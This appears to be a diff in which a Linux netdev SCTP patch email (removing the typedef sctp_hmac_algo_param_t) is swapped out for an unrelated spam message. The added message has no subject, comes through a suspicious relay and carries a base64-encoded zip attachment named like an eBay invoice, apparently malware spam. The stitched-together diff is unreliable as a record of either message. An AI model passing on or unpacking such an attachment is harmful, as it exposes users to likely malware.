@@ -1,112 +1,60 @@
-From: Xin Long <lucien.xin@gmail.com>
-Subject: [PATCH net-next 11/11] sctp: remove the typedef sctp_hmac_algo_param_t
-Date: Wed,  5 Jul 2017 08:32:29 +0800
-Message-ID: <a50a59f2ce1f9a6da5c0a8a8fa44636c95090e78.1499214692.git.lucien.xin@gmail.com>
-References: <cover.1499214692.git.lucien.xin@gmail.com>
- <6ba452f31d10acdc95f3cf679ecab15833f7843c.1499214692.git.lucien.xin@gmail.com>
- <77fa3a776118873a7e5d8203dd59011995b0e865.1499214692.git.lucien.xin@gmail.com>
- <090c24ed353f37a2bbce41ecc5feec6fc8cffa8b.1499214692.git.lucien.xin@gmail.com>
- <8d2e6145478bb4d24185d4ffd5547c7058f0dca9.1499214692.git.lucien.xin@gmail.com>
- <951d998920ecfe28f690739cd311bca3060751ff.1499214692.git.lucien.xin@gmail.com>
- <f094b5d16ed0f3b6fa255462bf957a104584f220.1499214692.git.lucien.xin@gmail.com>
- <afa9a191289fea55e077dcb4ad0bc34f7daee1b9.1499214692.git.lucien.xin@gmail.com>
- <47150ed6b890f50976139be3cd42df5c2f093fdd.1499214692.git.lucien.xin@gmail.com>
- <b3819a4686f14805c3d9d9a1a5612a3b151bbb5b.1499214692.git.lucien.xin@gmail.com>
- <ff452ac5711bd9ebffab97863e7e16984848f30b.1499214692.git.lucien.xin@gmail.com>
-Cc: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>,
-        Neil Horman <nhorman@tuxdriver.com>, davem@davemloft.net
-To: network dev <netdev@vger.kernel.org>, linux-sctp@vger.kernel.org
+From: <helga.brickl@arcor.de>
+Subject: (unknown)
+Date: Wed, 05 Jul 2017 00:55:10 -0000
+Message-ID: <149921611085.4332.3758266899945219792@aircel.co.in>
+Mime-Version: 1.0
+Content-Type: application/zip; name="EBAY_4714145_netdev.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-pg0-f68.google.com ([74.125.83.68]:32769 "EHLO
-        mail-pg0-f68.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752282AbdGEAeQ (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Tue, 4 Jul 2017 20:34:16 -0400
-In-Reply-To: <ff452ac5711bd9ebffab97863e7e16984848f30b.1499214692.git.lucien.xin@gmail.com>
-In-Reply-To: <cover.1499214692.git.lucien.xin@gmail.com>
-References: <cover.1499214692.git.lucien.xin@gmail.com>
+Received: from abs-static-140.61.251.27.aircel.co.in ([27.251.61.140]:46581
+        "HELO aircel.co.in" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1752296AbdGEAzS (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Tue, 4 Jul 2017 20:55:18 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-This patch is to remove the typedef sctp_hmac_algo_param_t, and
-replace with struct sctp_hmac_algo_param in the places where it's
-using this typedef.
-
-It is also to use sizeof(variable) instead of sizeof(type).
-
-Signed-off-by: Xin Long <lucien.xin@gmail.com>
----
- include/linux/sctp.h       | 4 ++--
- include/net/sctp/structs.h | 2 +-
- net/sctp/auth.c            | 4 ++--
- net/sctp/endpointola.c     | 4 ++--
- 4 files changed, 7 insertions(+), 7 deletions(-)
-
-diff --git a/include/linux/sctp.h b/include/linux/sctp.h
-index b52def9..913474d 100644
---- a/include/linux/sctp.h
-+++ b/include/linux/sctp.h
-@@ -327,10 +327,10 @@ struct sctp_chunks_param {
- };
- 
- /* AUTH Section 3.3 HMAC Algorithm */
--typedef struct sctp_hmac_algo_param {
-+struct sctp_hmac_algo_param {
- 	struct sctp_paramhdr param_hdr;
- 	__be16 hmac_ids[0];
--} sctp_hmac_algo_param_t;
-+};
- 
- /* RFC 2960.  Section 3.3.3 Initiation Acknowledgement (INIT ACK) (2):
-  *   The INIT ACK chunk is used to acknowledge the initiation of an SCTP
-diff --git a/include/net/sctp/structs.h b/include/net/sctp/structs.h
-index 8042e63..66cd763 100644
---- a/include/net/sctp/structs.h
-+++ b/include/net/sctp/structs.h
-@@ -1558,7 +1558,7 @@ struct sctp_association {
- 		 */
- 		struct sctp_random_param *peer_random;
- 		struct sctp_chunks_param *peer_chunks;
--		sctp_hmac_algo_param_t *peer_hmacs;
-+		struct sctp_hmac_algo_param *peer_hmacs;
- 	} peer;
- 
- 	/* State       : A state variable indicating what state the
-diff --git a/net/sctp/auth.c b/net/sctp/auth.c
-index 367994d..00667c5 100644
---- a/net/sctp/auth.c
-+++ b/net/sctp/auth.c
-@@ -187,7 +187,7 @@ static int sctp_auth_compare_vectors(struct sctp_auth_bytes *vector1,
- static struct sctp_auth_bytes *sctp_auth_make_key_vector(
- 			struct sctp_random_param *random,
- 			struct sctp_chunks_param *chunks,
--			sctp_hmac_algo_param_t *hmacs,
-+			struct sctp_hmac_algo_param *hmacs,
- 			gfp_t gfp)
- {
- 	struct sctp_auth_bytes *new;
-@@ -228,7 +228,7 @@ static struct sctp_auth_bytes *sctp_auth_make_local_vector(
- 	return sctp_auth_make_key_vector(
- 			(struct sctp_random_param *)asoc->c.auth_random,
- 			(struct sctp_chunks_param *)asoc->c.auth_chunks,
--			(sctp_hmac_algo_param_t *)asoc->c.auth_hmacs, gfp);
-+			(struct sctp_hmac_algo_param *)asoc->c.auth_hmacs, gfp);
- }
- 
- /* Make a key vector based on peer's parameters */
-diff --git a/net/sctp/endpointola.c b/net/sctp/endpointola.c
-index 35bf5af..3d506b2 100644
---- a/net/sctp/endpointola.c
-+++ b/net/sctp/endpointola.c
-@@ -73,8 +73,8 @@ static struct sctp_endpoint *sctp_endpoint_init(struct sctp_endpoint *ep,
- 		 * variables.  There are arrays that we encode directly
- 		 * into parameters to make the rest of the operations easier.
- 		 */
--		auth_hmacs = kzalloc(sizeof(sctp_hmac_algo_param_t) +
--				sizeof(__u16) * SCTP_AUTH_NUM_HMACS, gfp);
-+		auth_hmacs = kzalloc(sizeof(*auth_hmacs) +
-+				     sizeof(__u16) * SCTP_AUTH_NUM_HMACS, gfp);
- 		if (!auth_hmacs)
- 			goto nomem;
- 
--- 
-2.1.0
+UEsDBBQDAAAIADKm5EqSuRgxlggAAKIIAAAJAAAAMDAxMTYuemlwfVZHUBMIAAy9SpMiBEMvRwu9
+I4gYmvSS0EEwgEJASkzo6EFA6e2oEhVEFKUKUgWEQMAEiEBA1AgKYjRICVXKeXe/m7nbfezszD53
+dtbRlolZkAkAYAdoPvxs85zdIWWFDQCoFQQAgAAAQF1dU0tdQ0dDS0NbR1srDBEb4wGNcgpFqF2N
+roWhb5DM+E4qIpo3MdbMMpYmSkvxKSxe/CqTUajevDBJbdnQFob6peAbO6MDi700mYpO5IpeK9S9
+PFcs0NjUT81RqPcEhpcM4bfeHvRXs4XWEiHAGa636801roonGXlv+spQb2a3AbmGafimPUQP/fv1
+/RZOpbJLrPtfvglxa8wwHn62EO7qv8/kDH67PRU5G7XwJI5pSLwHolMFUzam2ovAFDRnvtyquMck
+Tma4x0X+o7jRqlRf75nRcQqeL/lWH+Rho+otFpFu+98GaQOPojXPPqsvZE+wPlPRbvKDm7gCJRPE
+chl89jpEbuhzMP7OIn559UFOtKrai4tdELpBQfPNftrQG25ebHbjzUUUeT5DzMC4TeRgk47wXOpf
+a1ZIa6OYD62hEJTdrrhSffD0I7+Xp6SmRJasJYP5RlNZXFqZxK1xpiWZn+PNV44TLXRBSDvtuIUk
+uwzyqw4pntHex4KGrLqqbEABncTVhbvp4lJchBFZelUNT7vRsoDvWBd8wcXupVMfHBWqz2R+50KR
+gCrjWv3rMzZFpXcGaqa2EI1iVZ5Xy2vwjEk1vWtCdOjaYx8qYTsqQsfnbnoh7tNgm7dXNsbk/ikH
+814dv5fK2Q6UHQkKVbX3Ngr9Pkl0L64AW3R9TWQXpd0820ju+MgGzdgaCXTy4TWKao/VHV0JnDee
+yGgBA/1H8r7OqehVziqIcTC5Pr3vfA87SXpt8QKyyoEH8RiTOSLf6+husEv2EoLaQyQO3fVLJjy/
+pCg2og+y4H0czUGmCaP3xeOe5HdSr+Usql25KIeo3ivRKhx3ENRhr2PYWHYGVSlJcuBg+s2ih1Ti
+KVxsU7GnzbSwfCLvtxK4ns9CP5Z3TD2IRYPNIiRf8xWay7SnJ6A8ye7OhmQn36Hc4kWDT7xyvmjq
+97NuaKnkvgEg+6rB2Cw1GxpMmP22dUeP1lG11j3umxwZayKerfDWFbNZTXg6nN0b4/1jltfqhWfy
+/Duh27Wb+E8KDtVVKyA3qc5J7oZu1iRQd76K8uUE83yCO0lWIffQuAUZch7UiRZcyW+/8BD925Bg
+13rAzMjdp19hSfRjF9qiRTwKirI62t8LKcHkF3B6TagCZeYtwGZ4HDHrdVmENVc/qMwrVcnfSbV0
+z6/rYZZb4rN9HemKzkpzVXnCEVvVukRMW/LkdTMFM7AvVuCANacvIdMeuXdu/YrIe8vhEU4hI4bm
+vNvFyCEVJeGbsDJrE4bfwi1THCnY9P1pRzuKj25/Havrze+K3e2XrlJ9hUwM+D+e1Ev5WdsidrOv
+ngRNGyJiKkhCWpAjcYGt+WBfiia/k9xWnrqJLtuLz6YEZt8PHGm1VmBStfOg7e35/VANLbtHp/hD
+s8XHf+elDpNaH2CXH5taX7jiN4tfRjoNNcly/AQ7bbRZ7bobutbHyJryzafW5f1qx35gtb+4IvGy
+a5U//4fqolyUjWoRT9URbx19U2OARIkDw/3zia4eexOKmGwM7NgtY7nafTsAj1BuIxrfoA0DTR7A
+nqxDqu27CqFn/R37uiJVLUtk0za65+ojDnCookv8GgbO5TZpucVW0NXSqUqAg3ZwZkXJqbS0s+GZ
+dqsrTv7MrGG09QwiJAGTg2QY03tvvMAjK9To7tfEnC6Dmzod2N74s8RS8TCm51heEoVHe8jVNvTF
+QjGg4aOgl/nTaZhgZxAgNauCI/H5ZQt4EealRN6hw4pmincU++gQrmqyXTR6N8HFKxfSKt/gFilL
+kOHN0cAWL33rIkYoibsd2DsUFDS9/cP/p/fPa9wnHquD7hHMD893Yz7aXMh59rY6cKGk6PuIzePp
+OdiP+fNjbT76M2uV9SCAlufgufsRlOPRpJgiEcyKEZnHZE5aVBi9E2dJCQyTNvBU18kI8yiGrPsv
+PNb+/UMRMuR1nBtpMcBVTgIEd2upOWxQQjsn8Qgwh3ApGWKIp2hmy1ecAVEw5VBsKGNQv29GaJ/D
+H1HySwdW8MJsp48MtoDEQfecyyzm7B1clh7I03s8RSEndZNWnK32FU2+73xESFtZwubnrtvvmDOe
+NGgXpEPLVW1jIkdNfT+Vnb9ASOU1KA3RcKKl2QdhpWlgiBdyBx7OyfOuHzhx5oiwPoY9dtc3GJMl
+AF9d8k6S5uHSN1fjMavx5WIezJenRRd72/eUaupttMCw2WPBx3xAeRT72EYavM69dQy8voTs6Cls
+GE/KSB0MMIwj5UplLqq/o4Mgotx4fRn+rskUoUBWGcs5x5IMbWtoS2jYAxm2J05pfle+suieo8CC
+pvq2VaM53UkcJNyQ6F0/71HkVvF1Dftn0uPDtUICpSi6kvDTZJVoJxQQHNtR27hkH4+eiScbnWbp
+GDHibRz7tWJzsq+FtejU7fDdsDYrRIsksbRZGbesaVxud6/LZcHbm0aKp2ngAH0yTdaoUbED4QEO
+15E2SmfqxdTATpOg3edCoBcN3iwpaFdDeF1ANwPryVJ9ySJHxnRK4Wc9onPBBJ6KCMRRgPI08C24
+ErBSUl3PhlyBH21SqB2f704yqcyizy83uUxCTsejkFdDx7+lSZFise9KDcjDPAnnW8iQTxtm13zY
+3qSvPQdubwbFBNwKZzsHpWcvZj7pKGehBSN9yV8g11ZiyW4b+Zl+sq/g0bPcBdNaQri672CECEzF
+1eb2zqV7xXUJqaeBOtRDgKMtA6Mp038dBFnAP5BMqUkF/P9d4ARI/h1lAJwBpKA9ChS3SQz/Vkdb
+Fta/M78Y/ksl2P9yfwJQSwECPwMUAwAACAAypuRKkrkYMZYIAACiCAAACQAkAAAAAAAAACCApIEA
+AAAAMDAxMTYuemlwCgAgAAAAAAABABgAgHlZkij10gGAeVmSKPXSAYB5WZIo9dIBUEsFBgAAAAAB
+AAEAWwAAAL0IAAAAAA==
